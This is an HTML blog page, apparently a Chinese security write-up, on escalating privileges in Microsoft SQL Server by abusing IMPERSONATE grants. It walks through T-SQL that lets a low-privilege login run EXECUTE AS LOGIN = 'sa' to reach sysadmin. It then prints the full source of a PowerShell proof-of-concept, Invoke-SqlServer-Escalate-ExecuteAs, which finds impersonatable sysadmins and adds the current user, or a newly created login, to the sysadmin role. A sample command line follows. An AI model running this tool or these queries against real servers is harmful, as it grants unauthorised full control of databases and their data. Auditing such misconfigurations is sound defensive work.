@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Mssql 模拟登录提权0x01 前提开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。 0x02 复现1.sa用户登录创建4个用户-- Create login 1 CREATE LOGIN MyUser1 WITH PASSWORD &#x3D; &#39;MyPassword!&#39;; -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Mssql/Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Mssql 模拟登录提权0x01 前提开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。 0x02 复现1.sa用户登录创建4个用户-- Create login 1 CREATE LOGIN MyUser1 WITH PASSWORD &#x3D; &#39;MyPassword!&#39;; -">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId38.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId39.png">
+<meta property="article:published_time" content="2022-07-08T06:25:59.706Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.671Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Mssql/Mssql 模拟登录提权" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Mssql/Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.706Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Mssql-模拟登录提权"><a href="#Mssql-模拟登录提权" class="headerlink" title="Mssql 模拟登录提权"></a>Mssql 模拟登录提权</h1><h2 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h2><p>开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。</p>
+<h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><h4 id="1-sa用户登录创建4个用户"><a href="#1-sa用户登录创建4个用户" class="headerlink" title="1.sa用户登录创建4个用户"></a>1.sa用户登录创建4个用户</h4><pre><code>-- Create login 1
+CREATE LOGIN MyUser1 WITH PASSWORD = &#39;MyPassword!&#39;;
+-- Create login 2
+CREATE LOGIN MyUser2 WITH PASSWORD = &#39;MyPassword!&#39;;
+-- Create login 3
+CREATE LOGIN MyUser3 WITH PASSWORD = &#39;MyPassword!&#39;;
+-- Create login 4
+CREATE LOGIN MyUser4 WITH PASSWORD = &#39;MyPassword!&#39;;
+</code></pre>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId24.png" alt="1.png"></p>
+<h4 id="2-赋予用户MyUser1权限来模拟-MyUser2-MyUser3-及sa"><a href="#2-赋予用户MyUser1权限来模拟-MyUser2-MyUser3-及sa" class="headerlink" title="2.赋予用户MyUser1权限来模拟 MyUser2, MyUser3,及sa"></a>2.赋予用户MyUser1权限来模拟 MyUser2, MyUser3,及sa</h4><pre><code>USE master;
+GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
+GO
+</code></pre>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId26.png" alt="2.png"></p>
+<p>这里的GRANT IMPERSONATE ON<br>LOGIN意思是授权MyUser1用户对sa,MyUser2,MyUser3用户登录权限，查看sqlserver的文档<code>https://docs.microsoft.com/zh-cn/sql/t-sql/statements/grant-server-principal-permissions-transact-sql?view=sql-server-ver15</code></p>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId27.png" alt="3.png"></p>
+<p>在SQL Server的安全模型中，模拟（IMPERSONATE<br>）权限的安全对象是User或Login，被授予者（Grantee<br>）有权限模拟指定用户，在其安全上下文执行特定的操作。例如，user1授予模拟user2的权限，当user2的安全上下文有足够的权限，而user1没有时，通过权限模拟，user1能够在user2的权限上下文中执行查询请求：</p>
+<pre><code>GRANT IMPERSONATE ON USER:: user2 TO user1;
+</code></pre>
+<p>通过执行EXECUTE AS<br>命令模拟用户的权限，用户user1就运行在user2的安全上下文中，例如，user1在登陆数据库之后，模拟user2的权限：</p>
+<pre><code>EXECUTE AS USER = &#39;user2&#39;;
+</code></pre>
+<h4 id="3-查找可以模拟登录的用户"><a href="#3-查找可以模拟登录的用户" class="headerlink" title="3.查找可以模拟登录的用户"></a>3.查找可以模拟登录的用户</h4><p>默认情况下，系统管理员可以模拟任何人，但是正常登录必须分配权限来模拟特定的用户，使用MyUser1用户登录，打开新建查询，执行下面语句查询那些用户可以用来模拟登录</p>
+<pre><code>SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = &#39;IMPERSONATE&#39;
+</code></pre>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId29.png" alt="4.png"></p>
+<p>这里我们可以看到MyUser1用户可以模拟登录sa,MyUser2,MyUser2用户，接下来就是模拟登录sa来获取sysadmin权限了</p>
+<h4 id="4-模拟SQL-Server用户登陆"><a href="#4-模拟SQL-Server用户登陆" class="headerlink" title="4.模拟SQL Server用户登陆"></a>4.模拟SQL Server用户登陆</h4><pre><code>-- 验证是否为sysadmin权限
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
+-- 模拟sa登录
+EXECUTE AS LOGIN = &#39;sa&#39;
+-- 验证是否为sysadmin权限
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
+</code></pre>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId31.png" alt="5.png"></p>
+<p>可以看到，第二个查询之后我们已经是sysadmin的权限了</p>
+<p>我们再用查看登录用户来验证下</p>
+<pre><code>SELECT * FROM master.sys.sysusers
+WHERE islogin = 1
+</code></pre>
+<p>模拟sa登录之前</p>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId32.png" alt="6.png"></p>
+<p>模拟sa登录之后</p>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId33.png" alt="7.png"></p>
+<p>权限高了，可以看到更多的用户登录</p>
+<h4 id="5-回到原来的登录"><a href="#5-回到原来的登录" class="headerlink" title="5.回到原来的登录"></a>5.回到原来的登录</h4><pre><code>REVERT
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
+</code></pre>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId35.png" alt="8.png"></p>
+<p>这样我们又回到myuser1用户登录的会话了</p>
+<h2 id="0x03-工具化"><a href="#0x03-工具化" class="headerlink" title="0x03 工具化"></a>0x03 工具化</h2><blockquote>
+<p>当然这个也可以用powershell一键实现</p>
+</blockquote>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p>Invoke-SqlServer-Escalate-ExecuteAs.psm1</p>
+</blockquote>
+<pre><code>function Invoke-SqlServer-Escalate-ExecuteAs
+&#123;
+    &lt;#
+    .SYNOPSIS
+    This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.
+
+    .DESCRIPTION
+    This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.
+    In most cases this results in additional data access, but in some cases it can be used to gain sysadmin
+    privileges.  This script can also be used to add a new sysadmin instead of escalating the privileges of
+    the existing user.  
+
+    .EXAMPLE
+    Adding the current user to the syadmin role if the user has permissions to impersonate the sa account.
+
+    PS C:\&gt; Invoke-SqlServer-Escalate-ExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
+    [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
+    [*] Connected.
+    [*] Enumerating users that myappuser can impersonate...
+    [*] 3 accounts can be impersonated:
+    [*] - user2
+    [*] - superuser
+    [*] - sa
+    [*] Checking if any of are sysadmins...
+    [*] - user2 - NOT sysadmin
+    [*] - superuser - NOT sysadmin
+    [*] - sa - sysadmin!
+    [*] Attempting to add myappuser to the sysadmin role via impersonation...
+    [*] Verifying that myappuser was added to the sysadmin role...
+    [*] Success! - myappuser is now a sysadmin.
+    [*] All done.
+
+    .EXAMPLE
+    Creating a new sysadmin as a user with permissions to impersonate the sa account.
+
+    PS C:\&gt; Invoke-SqlServer-Escalate-ExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -NewUser eviladmin -NewPass MyPassword!
+    [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
+    [*] Connected.
+    [*] Enumerating users that myappuser can impersonate...
+    [*] 3 accounts can be impersonated:
+    [*] - user2
+    [*] - superuser
+    [*] - sa
+    [*] Checking if any of are sysadmins...
+    [*] - user2 - NOT sysadmin
+    [*] - superuser - NOT sysadmin
+    [*] - sa - sysadmin!
+    [*] Attempting to create and add eviladmin to the sysadmin role via impersonation...
+    [*] Verifying that eviladmin was added to the sysadmin role...
+    [*] Success! - eviladmin is now a sysadmin.
+    [*] All done.
+
+    .LINK
+       http://www.netspi.com
+       http://msdn.microsoft.com/en-us/library/ms178640.aspx
+
+    .NOTES
+       Author: Scott Sutherland - 2014, NetSPI
+       Version: Invoke-SqlServer-Escalate-ExecuteAs.psm1 v1.0
+       Comments: This should work on SQL Server 2005 and Above.
+       
+    .TODO
+    fix double run bug
+    fix alternative creds connection use
+    #&gt;
+
+  [CmdletBinding()]
+  Param(
+    
+    [Parameter(Mandatory=$false,
+    HelpMessage=&#39;Set SQL Login username.&#39;)]
+    [string]$SqlUser,
+    
+    [Parameter(Mandatory=$false,
+    HelpMessage=&#39;Set SQL Login password.&#39;)]
+    [string]$SqlPass,
+
+    [Parameter(Mandatory=$false,
+    HelpMessage=&#39;Set SQL Login username.&#39;)]
+    [string]$NewUser,
+    
+    [Parameter(Mandatory=$false,
+    HelpMessage=&#39;Set SQL Login password.&#39;)]
+    [string]$NewPass,
+
+    [Parameter(Mandatory=$false,
+    HelpMessage=&#39;Execute query under impersonated user context.&#39;)]
+    [string]$Query,
+
+    [Parameter(Mandatory=$true,
+    HelpMessage=&#39;Set target SQL Server instance.&#39;)]
+    [string]$SqlServerInstance
+    
+  )
+
+    # -----------------------------------------------
+    # Setup database connection string
+    # -----------------------------------------------
+    
+    # Create fun connection object
+    $conn = New-Object System.Data.SqlClient.SqlConnection
+    
+    # Set authentication type and create connection string
+    if($SqlUser)&#123;
+    
+        # SQL login / alternative domain credentials
+         Write-Output &quot;[*] Attempting to authenticate to $SqlServerInstance with SQL login $SqlUser...&quot;
+        $conn.ConnectionString = &quot;Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;&quot;
+        [string]$ConnectUser = $SqlUser
+    &#125;else&#123;
+            
+        # Trusted connection
+        Write-Output &quot;[*] Attempting to authenticate to $SqlServerInstance as the current Windows user...&quot;
+        $conn.ConnectionString = &quot;Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;&quot;   
+        $UserDomain = [Environment]::UserDomainName
+        $Username = [Environment]::UserName
+        $ConnectUser = &quot;$UserDomain\$Username&quot;                    
+     &#125;
+
+
+    # -----------------------------------------------
+    # Test database connection
+    # -----------------------------------------------
+    try&#123;
+        $conn.Open()
+        Write-Host &quot;[*] Connected.&quot; -foreground &quot;green&quot;
+        $conn.Close()
+    &#125;catch&#123;
+        $ErrorMessage = $_.Exception.Message
+        Write-Host &quot;[*] Connection failed&quot; -foreground &quot;red&quot;
+        Write-Host &quot;[*] Error: $ErrorMessage&quot; -foreground &quot;red&quot;  
+        Break
+    &#125;
+
+
+    # -----------------------------------------------
+    # Check if the user is already a sysadmin
+    # -----------------------------------------------
+
+    # Open db connection
+    $conn.Open()
+
+    # Setup query
+    $Query = &quot;select is_srvrolemember(&#39;sysadmin&#39;) as sysstatus&quot;
+
+    # Execute query
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+
+    # Parse query results
+    $TableIsSysAdmin = New-Object System.Data.DataTable
+    $TableIsSysAdmin.Load($results)  
+
+    # Check if current user is a sysadmin
+    $TableIsSysAdmin | Select-Object -First 1 sysstatus | foreach &#123;
+
+        $Checksysadmin = $_.sysstatus
+        if ($Checksysadmin -ne 0)&#123;
+                Write-Host &quot;[*] You&#39;re already a sysadmin - no escalation needed.&quot; -foreground &quot;green&quot;
+                Write-Host &quot;[*] All Done.&quot;
+                Break             
+        &#125;
+    &#125;
+
+    # Close db connection
+    $conn.Close()
+
+    # -----------------------------------------------
+    # Get a list of the users that can be impersonated
+    # -----------------------------------------------     
+    
+    # User status
+    Write-Host &quot;[*] Enumerating a list of users that can be impersonated...&quot;  
+
+    # Open db connection
+    $conn.Open()
+
+    # Setup query
+    $QueryDatabases = &quot;SELECT DISTINCT b.name
+    FROM sys.server_permissions a
+    INNER JOIN sys.server_principals b
+    ON a.grantor_principal_id = b.principal_id 
+    WHERE a.permission_name = &#39;IMPERSONATE&#39;&quot;
+
+    # Execute query    
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryDatabases,$conn)
+    $results = $cmd.ExecuteReader()
+
+    # Parse query results
+    $TableImpUsers = New-Object System.Data.DataTable 
+    $TableImpUsers.Load($results)
+
+    # Check if any users can be impersonated
+    if ($TableImpUsers.rows.count -eq 0)&#123;
+
+    # Status user
+    Write-Host &quot;[*] Sorry, the current user doesn&#39;t have permissions to impersonate anyone.&quot; -foreground &quot;red&quot;
+        Write-Host &quot;[*] All done.&quot; 
+        break
+    &#125;else&#123;
+        
+        # Status user   
+    $ImpUserCount = $TableImpUsers.rows.count      
+    Write-Host &quot;[*] Found $ImpUserCount users that can be impersonated:&quot; 
+    
+    # Display users
+        $TableImpUsers | foreach&#123;
+            $ImpUser = $_.name
+            Write-Host &quot;[*] - $ImpUser&quot;
+        &#125;
+    &#125;
+
+    # Close db connection
+    $conn.Close() 
+
+    # ----------------------------------------------------------------
+    # Check if any of the users that can be impersonated are sysadmins
+    # ----------------------------------------------------------------
+    if ($TableImpUsers.rows.count -ne 0)&#123;   
+
+        # Status user
+        Write-Host &quot;[*] Checking if any of them are sysadmins...&quot;
+
+        # Setup data table to store list of sysadmins that can be impersonated
+        $TableImpUserSysAdmins = New-Object System.Data.DataTable
+        $TableImpUserSysAdmins.Columns.Add(&#39;name&#39;) | Out-Null
+
+        $TableImpUsers | foreach &#123;
+            
+            # Open db connection
+            $conn.Open()
+
+            # Setup query
+            $ImpUser = $_.name
+            $Query = &quot;select IS_SRVROLEMEMBER(&#39;sysadmin&#39;,&#39;$ImpUser&#39;) as status&quot;
+
+            # Execute query
+        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+        $results = $cmd.ExecuteReader()             
+
+            # Parse query results
+            $TableImpUserSysAdminsCheck = New-Object System.Data.DataTable 
+            $TableImpUserSysAdminsCheck.Load($results)
+
+            $TableImpUserSysAdminsCheck | foreach&#123;
+            $SysAdminStatus = $_.status
+            &#125;
+            
+            # Check if the impersonatable user is a sysadmin
+            if ($SysAdminStatus -eq 0)&#123;
+                Write-Host &quot;[*] - $ImpUser - NOT sysadmin&quot; 
+            &#125;else&#123;
+                Write-Host &quot;[*] - $ImpUser - sysadmin!&quot; -foreground &quot;green&quot;
+
+                # Add to data table
+                $TableImpUserSysAdmins.Rows.Add($ImpUser) | Out-Null     
+            &#125;
+
+           # Clear check
+           $TableImpUserSysAdminsCheck.Clear()
+
+           # Close db connection
+           $conn.Close()
+        &#125;
+    &#125;
+
+
+    # -------------------------------------------------
+    # Attempt to escalate privileges
+    # -------------------------------------------------
+
+    # Verify that a sysadmin user can be impersonated
+    $ImpUserSysadminsCount = $TableImpUserSysAdmins.rows.count 
+    if ($ImpUserSysadminsCount -ne 0) &#123;        
+
+        # Open db connection
+        $conn.Open()
+
+        # Check if we are going to add a new sysadmin or elevate the current one for query
+        if ($newuser -and $newPass)&#123;
+            $AddUser = &quot;CREATE LOGIN $newuser WITH PASSWORD = &#39;$newPass&#39;&quot;
+            $UsertoElevate = $newuser
+            $Message = &quot; create and&quot;
+        &#125;else&#123;
+            $AddUser = &quot;&quot;
+            $UsertoElevate = $ConnectUser
+            $Message = &quot;&quot;
+        &#125;
+
+        # Status user
+        Write-Host &quot;[*] Attempting to$Message add $UsertoElevate to the sysadmin role via impersonation...&quot;
+
+        # Get the sysadmin user that can be impersonated
+        $TableImpUserSysAdmins | foreach &#123;
+            $ImpUser = $_.name
+        &#125;
+
+        # Setup query
+        $Query = &quot;EXECUTE AS Login = &#39;$ImpUser&#39;;
+        $AddUser;
+        EXEC sp_addsrvrolemember &#39;$UsertoElevate&#39;,&#39;sysadmin&#39;;
+        SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;,&#39;$UsertoElevate&#39;) as status;&quot;
+
+        # Execute query
+        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+        $results = $cmd.ExecuteReader() 
+
+        # Status user
+        Write-Host &quot;[*] Verifying that $UsertoElevate was added to the sysadmin role...&quot;
+
+        # Parse query results
+        $TableVerify = New-Object System.Data.DataTable
+        $TableVerify.Load($results)  
+
+        # Check if user is a sysadmin
+        $TableVerify| Select-Object -First 1 status | foreach &#123;
+
+            $VerifySysadmin = $_.status
+            if ($VerifySysadmin -eq 1)&#123;
+                Write-Host &quot;[*] Success - $UsertoElevate is now a sysadmin!&quot; -foreground &quot;green&quot;
+                Write-Host &quot;[*] All Done.&quot;          
+            &#125;else&#123;
+                Write-Host &quot;[*] Failed - Something went wrong!.&quot; -foreground &quot;red&quot;
+                Write-Host &quot;[*] All Done.&quot;
+            &#125; 
+        &#125;  
+
+        # Close db connection
+        $conn.Close()                        
+    &#125;else&#123;
+         Write-Host &quot;[*] Sorry, the $ConnectUser account can&#39;t impersonate any sysadmins.&quot; -foreground &quot;red&quot; 
+         Write-Host &quot;[*] All done.&quot; 
+    &#125;  
+    
+&#125;
+</code></pre>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId38.png" alt="9.png"></p>
+<pre><code>Invoke-SqlServer-Escalate-ExecuteAs -SqlUser MyUser1 -SqlPass MyPassword! -SqlServerInstance WIN-80LVKKRM5UA
+</code></pre>
+<p><img src="/resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId39.png" alt="10.png"></p>
+<p>总的来说，利用这个来提权也不算是漏洞，毕竟可能是运维人员想要的正常功能，然后被攻击者利用，达到提权sysadmin的目的。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Mssql/Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/" data-id="cl5c2qsn900bqy8v1avz1hp0a" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/MyBB/MyBB%20_=%201.8.3%20rce%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Mssql/Mssql%20%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
